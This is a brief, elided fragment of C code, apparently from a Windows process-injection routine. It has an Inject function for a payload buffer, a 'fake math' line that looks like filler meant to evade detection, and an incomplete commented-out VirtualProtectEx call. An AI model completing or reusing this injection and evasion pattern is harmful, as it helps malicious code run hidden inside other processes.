...
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
		...
		*faker = fake % 33;//fake math
		//int rv = 69;
		//rv = VirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE | PAGE_, (PDWORD) NULL);
